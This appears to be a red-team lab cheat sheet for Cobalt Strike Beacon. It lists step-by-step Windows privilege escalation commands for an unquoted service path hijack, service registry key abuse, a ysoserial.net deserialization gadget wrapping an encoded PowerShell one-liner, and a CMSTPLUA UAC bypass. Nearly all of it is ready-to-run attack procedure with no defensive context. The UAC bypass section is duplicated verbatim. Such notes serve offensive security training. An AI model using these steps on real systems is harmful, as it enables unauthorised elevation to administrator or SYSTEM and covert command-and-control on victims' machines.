# Kill Chain

## Unquoted Service Path <a href="#unquoted-service-path" id="unquoted-service-path"></a>

1. Verify the binary path of the service.
   1. `sc_qc BadWindowsService`
2. Verify the permissions of the target directory.
   1. `cacls "C:\Program Files\Bad Windows Service"`
3. Change Beacon's current working directory.
   1. `cd C:\Program Files\Bad Windows Service`
4. Upload a DNS Beacon service payload.
   1. `upload C:\Payloads\dns_x64.svc.exe`
5. Rename the payload to activate the hijack.
   1. `mv dns_x64.svc.exe Service.exe`
6.  Restart the service.

    1. `sc_stop BadWindowsService`
    2. `sc_start BadWindowsService`

    The new Beacon should appear immediately.
7. Interact with the new Beacon.
   1. `Run a checkin command.`
8. Delete the service payload.
   1. `rm Service.exe`

&#x20;

### &#x20;Service Registry Permissions

1. Verify the permissions of the service's regsitry key.
   1. `powerpick Get-Acl -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService' | fl`
2. Stop the service.
   1. `sc_stop BadWindowsService`
3. Change Beacon's current working directory.
   1. `cd C:\Temp`
4. Upload a DNS Beacon service payload.
   1. `upload C:\Payloads\dns_x64.svc.exe`
5. Get the current binary path.
   1. `sc_qc BadWindowsService`
6. Reconfigure the service to point to the payload.
   1. `sc_config BadWindowsService C:\Temp\dns_x64.svc.exe 0 2`
7.  Start the service.

    1. `sc_start BadWindowsService`

    The elevated Beacon should appear immediately.
8. Restore the binary path.
   1. `sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2`
9. Delete the service payload.
   1. `rm dns_x64.svc.exe`

## Unsafe Deserialization <a href="#unsafe-deserialization" id="unsafe-deserialization"></a>

1.  Host a PowerShell one-liner on the medium-integrity Beacon for a DNS Beacon payload.

    > Right-click the Beacon and select **Access > One-liner**.
2.  On your Attacker Desktop, generate a serialized gadget with ysoserial.net, using the PowerShell one-liner from the previous step.

    ```terminal-nocolor
    TerminalTypeCopyC:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc ..." -o raw --outputpath=C:\Payloads\data.bin
    ```
3. Change Beacon's current working directory.
   1. `cd C:\Temp`
4. Upload the gadget.
   1. `upload C:\Payloads\data.bin`
5.  Sit back and wait for up to 60 seconds for the elevated Beacon to appear.

    > Check that the service is running with `sc_query BadWindowsService` and use `sc_start BadWindowsService` is you need to.
6. Delet`e the gadget.`
   1. `rm data.bin`

## CMSTPLUA UAC Bypass <a href="#cmstplua-uac-bypass" id="cmstplua-uac-bypass"></a>

For this bypass technique to work, the process in which our Beacon is running must live in _C:\Windows\*_.

1. Spawn a new Beacon (this spawns in _C:\Windows\System32\rundll32.exe_ by default.)
   1. `spawn x64 http`
2.  Host a PowerShell one-liner on the new Beacon.

    > Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.
3. Run the provided one-liner via **runasadmin**.
   1. `runasadmin uac-cmstplua [ONE-LINER]`
4. Connect to the elevated Beacon.
   1. `connect localhost 1337`

## CMSTPLUA UAC Bypass <a href="#cmstplua-uac-bypass" id="cmstplua-uac-bypass"></a>

For this bypass technique to work, the process in which our Beacon is running must live in _C:\Windows\*_.

1. Spawn a new Beacon (this spawns in _C:\Windows\System32\rundll32.exe_ by default.)
   1. `spawn x64 http`
2.  Host a PowerShell one-liner on the new Beacon.

    > Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.
3. Run the provided one-liner via **runasadmin**.
   1. `runasadmin uac-cmstplua [ONE-LINER]`
4. Connect to the elevated Beacon.
   1. `connect localhost 1337`
